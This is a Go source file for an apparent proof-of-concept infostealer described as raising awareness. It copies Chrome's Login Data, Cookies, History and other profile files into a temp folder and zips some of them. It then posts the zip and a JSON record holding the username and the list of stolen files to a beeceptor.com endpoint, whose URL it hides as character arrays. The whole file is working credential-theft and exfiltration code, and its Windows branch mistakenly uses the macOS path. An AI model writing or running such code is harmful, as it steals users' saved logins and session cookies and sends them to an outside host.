package main

import (
	"os"
	"os/exec"
	utils "poc/pkg/utils"
	"runtime"
	"strings"
	"time"
)

const tmp_folder_name = "trust_me"

var files_to_steal = []string{
	"Google Profile Picture.png",
	"Login Data",
	"Cookies",
	"History",
	"Bookmarks",
}

const mac_path = "/Library/Application Support/Google/Chrome/Default/"
const win_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
const linux_path = ""

const readme_message = `This is just an example of what could be easily stolen from you,
all the contents in this folder were copied from your computer to here.
A zip was created with your picture and this readme file, and uploaded to a dummy endpoint.
Only you know this url, and you need to have the browser open to receive the http post content,
as soon as you close it the info will be gone.
If you see the information on your browser, any attacker could have gotten that info.
This project only purpose is to raise awareness on how easily it is to steal your private information.

Be mindfull of what you download and execute.

url: `

func main() {
	switch runtime.GOOS {
	case "windows":
		// fmt.Println("windows")
		user, err := utils.GetCurrentUser()
		if err != nil {
			os.Exit(0)
		}
		tmp_folder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmp_folder_name + "\\"
		if exploit(mac_path, tmp_folder, true) {

			cmd := exec.Command("cmd", "/C", "start", tmp_folder)
			cmd.Run()

			readme_file := tmp_folder + "readme.txt"
			cmd = exec.Command("cmd", "/C", "notepad", readme_file)
			cmd.Run()
		}
	case "darwin":
		// fmt.Println("mac")
		tmp_folder := "/tmp/" + tmp_folder_name + "/"
		if exploit(mac_path, tmp_folder, false) {
			cmd := exec.Command("open", tmp_folder)
			cmd.Run()
		}
	default:
		// fmt.Println("linux")
		tmp_folder := "/tmp/" + tmp_folder_name + "/"
		exploit(linux_path, tmp_folder, false)
	}
}

func exploit(os_path string, tmp_folder string, is_win bool) bool {
	var files []string
	for _, f := range files_to_steal {
		files = append(files, os_path+f)
	}

	// check if temp folder exists, if not, creates it
	utils.CreateTmpFolder(tmp_folder)

	user, err := utils.GetCurrentUser()
	if err != nil {
		os.Exit(0)
	}

	// honeybadger approach, try to get the file, if it doesn't succeed, it just doesn't care!
	for _, file_path := range files {
		full_path := user.HomeDir + file_path
		filename := utils.GetFileNameFromPath(full_path, is_win)
		dest := tmp_folder + filename
		// fmt.Println(dest)
		utils.FileCopy(full_path, dest)
	}

	// create readme
	random_string := utils.GenerateRandomString(40)
	readme_file := tmp_folder + "readme.txt"
	dummy_endpoint_to_view_url := urlBuilder("view", random_string)
	dummy_endpoint_to_post := urlBuilder("post", random_string)
	readme_content := readme_message + dummy_endpoint_to_view_url + "\n\nfolder: " + tmp_folder
	utils.CreateReadme(readme_file, readme_content)

	// Zip Files
	files_to_zip := []string{
		tmp_folder + utils.GetFileNameFromPath(files[0], is_win),
		readme_file,
	}
	zip_file := tmp_folder + "your_secrets.zip"
	utils.ZipFiles(files_to_zip, zip_file, is_win)

	// open url
	if is_win {
		cmd := exec.Command("cmd", "/C", "start", "", dummy_endpoint_to_view_url)
		cmd.Run()
	} else {
		cmd := exec.Command("open", dummy_endpoint_to_view_url)
		cmd.Run()
	}

	// wait 3 seconds
	time.Sleep(time.Second * 3)

	// post content
	utils.SendFiles(dummy_endpoint_to_post, zip_file)

	files_stolen := utils.ListDirRecursively(tmp_folder)

	// post more data
	json_string := `{"username":"` + user.Username + `", "files":"` + strings.Join(files_stolen, ",") + `", "msg":"you have just been pwned."}`
	utils.PostJson(dummy_endpoint_to_post, json_string, user.Username)

	return true
}

func urlBuilder(option string, random_string string) string {
	var full_string string

	switch option {
	case "view":
		// https://beeceptor.com/console/
		url := []string{"h", "t", "t", "p", "s", ":", "/", "/", "b", "e", "e", "c", "e", "p", "t", "o", "r", ".", "c", "o", "m", "/", "c", "o", "n", "s", "o", "l", "e", "/"}
		full_string = strings.Join(url, "") + random_string
	case "post":
		url := []string{"h", "t", "t", "p", "s", ":", "/", "/"}
		end := []string{".", "f", "r", "e", "e", ".", "b", "e", "e", "c", "e", "p", "t", "o", "r", ".", "c", "o", "m"}
		full_string = strings.Join(url, "") + random_string + strings.Join(end, "")
	}

	return full_string
}
